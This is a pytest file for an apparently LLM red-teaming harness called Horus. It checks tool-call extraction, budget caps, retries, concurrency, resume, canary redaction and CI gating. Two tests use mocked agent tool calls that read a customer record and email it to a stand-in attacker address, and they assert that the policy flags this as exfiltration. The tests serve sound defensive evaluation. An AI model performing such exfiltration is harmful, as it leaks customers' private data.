"""Enterprise operability tests.

These cover the things that decide whether a run can be trusted and repeated at
scale: that tool calls actually reach the evaluator from a real payload, that
the budget cap can fire, that concurrency does not change findings, that a
crashed run resumes without repeating paid work, and that secrets never leave in
an export.
"""

from __future__ import annotations

import json
from pathlib import Path

import httpx
import pytest

from horus.evaluator import EnsembleJudge, LLMJudge
from horus.export import collect_findings, exceeds, to_json, to_sarif, worst_finding_severity
from horus.models import Category, Outcome
from horus.orchestrator import Runner
from horus.pricing import Pricing
from horus.probes import load_packs
from horus.reporting import aggregate, set_category_resolver
from horus.storage import Store
from horus.targets import build_target
from horus.targets.http import HTTPTarget

PACKS = Path(__file__).parent.parent / "horus" / "probes" / "packs"


def _http(handler, **kw) -> HTTPTarget:
    t = HTTPTarget(endpoint="https://example.invalid/v1/chat", **kw)
    t._client = httpx.Client(transport=httpx.MockTransport(handler))
    return t


def _judge():
    return EnsembleJudge(LLMJudge(build_target({"kind": "mock_judge"})))


# --------------------------------------------------------------------------- #
# Tool calls must reach the evaluator from a real payload
# --------------------------------------------------------------------------- #
def test_tool_calls_are_extracted_from_an_openai_shaped_response():
    """Without this the whole agentic evaluation was inert against real targets.

    Trace judging, taint tracking and the tool policy all read
    ``attempt.tool_calls``; if the connector never fills it they see an empty
    list and silently have nothing to judge.
    """
    payload = {
        "choices": [{"message": {
            "content": "Done.",
            "tool_calls": [
                {"function": {"name": "read_customer_record",
                              "arguments": '{"id": "c1"}'}},
                {"function": {"name": "send_email",
                              "arguments": '{"to": "x@evil.example"}'}},
            ],
        }}]
    }
    t = _http(lambda req: httpx.Response(200, json=payload))
    r = t.send([{"role": "user", "content": "x"}])
    assert r.error is None
    assert len(r.tool_calls) == 2
    t.close()


def test_extracted_tool_calls_flow_through_to_a_policy_violation():
    """End to end: HTTP payload -> trace judge -> exfiltration finding."""
    from horus.agentic import ToolPolicy
    from horus.models import Attempt, JudgeKind, Probe, Severity, Turn

    policy = ToolPolicy.load(
        Path(__file__).parent.parent / "config" / "tool_policy.example.yaml"
    )
    payload = {"choices": [{"message": {
        "content": "I won't share confidential details.",
        "tool_calls": [
            {"function": {"name": "read_customer_record", "arguments": "{}"}},
            {"function": {"name": "send_email",
                          "arguments": '{"to": "x@evil.example"}'}},
        ],
    }}]}
    t = _http(lambda req: httpx.Response(200, json=payload))
    r = t.send([{"role": "user", "content": "summarise"}])
    t.close()

    probe = Probe(id="p", category=Category.TOOL_ABUSE, severity=Severity.CRITICAL,
                  turns=(Turn("user", "summarise"),),
                  expectation="must not exfiltrate", judge=JudgeKind.ENSEMBLE)
    attempt = Attempt(probe_id="p", run_id="r", repeat_index=0,
                      request=[{"role": "user", "content": "summarise"}],
                      response_text=r.text, tool_calls=r.tool_calls)

    v = EnsembleJudge(None, tool_policy=policy).judge(probe, attempt)
    assert v.outcome is Outcome.FAIL
    assert "exfiltration" in v.rationale


def test_missing_tool_calls_field_is_not_an_error():
    """Most targets are not agents; absence of tool calls is normal."""
    t = _http(lambda req: httpx.Response(
        200, json={"choices": [{"message": {"content": "hi"}}]}))
    r = t.send([{"role": "user", "content": "x"}])
    assert r.error is None and r.tool_calls == []
    t.close()


# --------------------------------------------------------------------------- #
# Cost accounting and the budget cap
# --------------------------------------------------------------------------- #
def test_pricing_computes_cost_from_usage():
    p = Pricing(input_per_1m=3.0, output_per_1m=15.0)
    assert p.cost(1_000_000, 0) == pytest.approx(3.0)
    assert p.cost(0, 1_000_000) == pytest.approx(15.0)
    assert p.is_declared


def test_undeclared_pricing_is_reported_so_the_cap_is_known_to_be_inert():
    t = _http(lambda req: httpx.Response(
        200, json={"choices": [{"message": {"content": "hi"}}]}))
    assert t.info().params["pricing_declared"] is False
    t.close()


def test_cost_is_populated_from_the_usage_block():
    t = _http(
        lambda req: httpx.Response(200, json={
            "choices": [{"message": {"content": "hi"}}],
            "usage": {"prompt_tokens": 1000, "completion_tokens": 500},
        }),
        pricing={"input_per_1m": 10.0, "output_per_1m": 30.0},
    )
    r = t.send([{"role": "user", "content": "x"}])
    assert r.cost_usd == pytest.approx(1000 / 1e6 * 10 + 500 / 1e6 * 30)
    t.close()


def test_budget_cap_actually_stops_a_run():
    """The cap was previously documented but unreachable: nothing set cost."""
    class Costly:
        kind = "costly"

        def send(self, messages):
            from horus.targets.base import TargetResponse
            return TargetResponse(text="ok", cost_usd=0.5)

        def info(self):
            from horus.models import TargetInfo
            return TargetInfo(kind="costly", model_snapshot="c1",
                              params={"pricing_declared": True})

    probes, hashes = load_packs([PACKS / "examples.yaml"])
    result = Runner(Costly(), _judge(), repeats=20, budget_usd=2.0).run(probes, hashes)
    assert "budget exceeded" in result.manifest.notes
    assert result.manifest.spent_usd >= 2.0
    assert len(result.attempts) < len(probes) * 20


# --------------------------------------------------------------------------- #
# Throttling
# --------------------------------------------------------------------------- #
def test_429_is_surfaced_with_the_providers_retry_after():
    t = _http(lambda req: httpx.Response(429, headers={"retry-after": "7"}))
    r = t.send([{"role": "user", "content": "x"}])
    assert r.error and "rate_limited" in r.error and "retry-after=7" in r.error
    t.close()


def test_runner_honours_retry_after_instead_of_guessing():
    from horus.orchestrator.runner import _retry_after_seconds

    assert _retry_after_seconds("rate_limited: retry-after=12") == 12.0
    assert _retry_after_seconds("http_error: boom") is None


# --------------------------------------------------------------------------- #
# Concurrency must not change findings
# --------------------------------------------------------------------------- #
def test_concurrent_run_produces_the_same_findings_as_a_sequential_one():
    """Concurrency is a scheduling detail; it must not leak into the report."""
    probes, hashes = load_packs([PACKS / "examples.yaml"])
    cat = {p.id: p.category for p in probes}
    set_category_resolver(lambda pid: cat[pid])

    seq = Runner(build_target({"kind": "mock"}), _judge(),
                 repeats=5, concurrency=1).run(probes, hashes)
    par = Runner(build_target({"kind": "mock"}), _judge(),
                 repeats=5, concurrency=6).run(probes, hashes)

    assert [(a.probe_id, a.repeat_index) for a in seq.attempts] == \
           [(a.probe_id, a.repeat_index) for a in par.attempts]
    assert [a.response_text for a in seq.attempts] == \
           [a.response_text for a in par.attempts]
    assert aggregate(seq.manifest, seq.attempts, seq.verdicts).overall_asr == \
           aggregate(par.manifest, par.attempts, par.verdicts).overall_asr


# --------------------------------------------------------------------------- #
# Checkpointing and resume
# --------------------------------------------------------------------------- #
def test_resume_skips_completed_work(tmp_path):
    probes, hashes = load_packs([PACKS / "examples.yaml"])
    store = Store(tmp_path / "r.db")

    first = Runner(build_target({"kind": "mock"}), _judge(),
                   repeats=2, concurrency=3, store=store).run(probes, hashes)
    done = len(store.completed_slots(first.manifest.run_id))
    assert done == len(probes) * 2

    second = Runner(build_target({"kind": "mock"}), _judge(), repeats=6,
                    concurrency=3, store=store,
                    run_id=first.manifest.run_id).run(probes, hashes)
    assert second.skipped == done
    assert len(store.completed_slots(first.manifest.run_id)) == len(probes) * 6
    store.close()


def test_every_attempt_is_persisted_as_it_completes(tmp_path):
    """Checkpointing is what makes resume possible; verify it is not batched."""
    probes, hashes = load_packs([PACKS / "examples.yaml"])
    store = Store(tmp_path / "c.db")
    seen: list[int] = []

    def progress(attempt, verdict):
        seen.append(
            store.conn.execute("SELECT COUNT(*) c FROM attempts").fetchone()["c"]
        )

    Runner(build_target({"kind": "mock"}), _judge(), repeats=2,
           store=store, on_progress=progress).run(probes, hashes)
    assert seen == sorted(seen) and seen[-1] == len(probes) * 2
    store.close()


def test_audit_log_records_who_ran_what(tmp_path):
    probes, hashes = load_packs([PACKS / "examples.yaml"])
    store = Store(tmp_path / "a.db")
    r = Runner(build_target({"kind": "mock"}), _judge(), repeats=1,
               store=store).run(probes, hashes)
    rows = store.conn.execute(
        "SELECT action, actor, target FROM audit WHERE run_id=?", (r.manifest.run_id,)
    ).fetchall()
    actions = {x["action"] for x in rows}
    assert {"run.start", "run.finish"} <= actions
    assert all(x["actor"] for x in rows)
    store.close()


# --------------------------------------------------------------------------- #
# Export
# --------------------------------------------------------------------------- #
def _run_for_export():
    probes, hashes = load_packs([PACKS / "examples.yaml"])
    cat = {p.id: p.category for p in probes}
    set_category_resolver(lambda pid: cat[pid])
    res = Runner(build_target({"kind": "mock"}), _judge(), repeats=6).run(probes, hashes)
    return probes, res


def test_export_redacts_canaries_but_keeps_the_finding():
    """A burned canary is worthless, and an export lands somewhere less
    protected than the system the secret came from."""
    probes, res = _run_for_export()
    findings = collect_findings(probes, res.attempts, res.verdicts)
    blob = json.dumps(to_json(findings, res.manifest))
    secrets = {c for p in probes for c in p.canaries}
    assert secrets
    for s in secrets:
        assert s not in blob
    assert "[REDACTED:CANARY]" in blob
    assert any("canary" in f.rationale.lower() for f in findings)


def test_sarif_is_well_formed_and_maps_to_the_taxonomy():
    probes, res = _run_for_export()
    findings = collect_findings(probes, res.attempts, res.verdicts)
    doc = to_sarif(findings, res.manifest)
    assert doc["version"] == "2.1.0"
    run = doc["runs"][0]
    assert run["tool"]["driver"]["name"] == "Horus"
    rule_ids = {r["id"] for r in run["tool"]["driver"]["rules"]}
    assert rule_ids <= {c.value for c in Category}
    for r in run["tool"]["driver"]["rules"]:
        assert r["properties"]["owasp-llm"]        # taxonomy carried into CI
    for r in run["results"]:
        assert r["ruleId"] in rule_ids
        assert r["level"] in {"note", "warning", "error"}
        assert r["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]


def test_only_failing_outcomes_become_findings():
    probes, res = _run_for_export()
    findings = collect_findings(probes, res.attempts, res.verdicts)
    bad = {v.attempt_id for v in res.verdicts
           if v.outcome in (Outcome.FAIL, Outcome.PARTIAL)}
    assert len(findings) == len(bad)


# --------------------------------------------------------------------------- #
# CI gate
# --------------------------------------------------------------------------- #
def test_ci_gate_thresholds():
    probes, res = _run_for_export()
    findings = collect_findings(probes, res.attempts, res.verdicts)
    assert exceeds(findings, "low")
    assert worst_finding_severity(findings) in {"medium", "high", "critical"}


def test_ci_gate_on_empty_findings_never_trips():
    assert not exceeds([], "low")
    assert worst_finding_severity([]) is None


def test_unknown_threshold_is_rejected():
    with pytest.raises(ValueError):
        exceeds([], "catastrophic")
